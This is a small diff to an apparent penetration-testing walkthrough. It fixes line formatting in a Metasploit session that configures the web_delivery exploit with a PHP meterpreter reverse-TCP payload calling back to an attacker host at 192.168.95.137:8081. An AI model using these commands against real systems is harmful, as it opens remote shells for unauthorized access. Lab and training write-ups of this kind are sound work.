@@ -106,7 +106,8 @@ The shell given is limited, for instance, you cannot change the current director
 msf > use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) > set target 1
 target => 1
-msf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcppayload => php/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
 msf exploit(multi/script/web_delivery) > set lhost 192.168.95.137
 lhost => 192.168.95.137
 msf exploit(multi/script/web_delivery) > set srvport 8081
